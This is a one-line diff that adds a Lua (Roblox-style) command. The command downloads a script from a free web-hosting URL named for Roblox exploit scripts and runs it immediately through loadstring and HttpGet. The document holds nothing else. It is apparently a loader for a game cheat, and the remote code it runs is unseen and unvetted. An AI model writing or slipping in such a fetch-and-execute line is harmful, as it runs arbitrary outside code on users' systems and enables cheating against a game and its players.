@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://awakenrobloxscripts.000webhostapp.com/erlc"))()
